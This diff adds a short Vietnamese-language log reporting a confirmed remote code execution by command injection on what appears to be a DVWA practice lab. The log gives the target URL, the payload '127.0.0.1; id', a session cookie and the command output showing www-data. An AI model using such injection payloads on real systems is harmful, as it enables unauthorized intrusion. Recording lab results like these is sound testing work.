@@ -1,0 +1,13 @@
+Command Injection thành công - RCE xác nhận.
+      - URL        : http://13.250.120.1:80/vulnerabilities/exec/
+      - Payload    : 127.0.0.1; id
+      - Cookie     : security=low; PHPSESSID=g7glvapkv8r53se146kfd2bg12
+      - CMD Output : PING 127.0.0.1 (127.0.0.1): 56 data bytes
+64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.036 ms
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.043 ms
+64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.044 ms
+64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.047 ms
+--- 127.0.0.1 ping statistics ---
+4 packets transmitted, 4 packets received, 0% packet loss
+round-trip min/avg/max/stddev = 0.036/0.042/0.047/0.000 ms
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
